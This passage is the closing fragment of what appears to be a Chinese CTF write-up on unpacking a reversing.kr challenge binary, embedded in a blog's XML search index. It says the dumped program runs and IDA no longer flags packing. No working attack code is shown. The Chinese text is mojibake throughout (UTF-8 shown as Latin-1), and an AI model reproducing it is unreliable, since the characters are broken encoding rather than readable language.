ä¸‹æ¥çš„æ–‡ä»¶ï¼Œå°±èƒ½å¾—åˆ°è„±æ‰äº†å£³çš„ç¨‹åºå•¦ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-7.png"
                      alt="image"
                ></p>
<p>ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå†æ¬¡ä½¿ç”¨IDAæ‰“å¼€ï¼Œä¹Ÿæ²¡æœ‰åŠ å£³æç¤ºäº†ï¼Œç›¸å…³çš„å‡½æ•°ä¹ŸæˆåŠŸä¿®å¤ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-6.png"
                      alt="image"
                ></p>
<p>æƒ³è¦è¯¦ç»†äº†è§£å¦‚ä½•è„±å£³å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
</search>
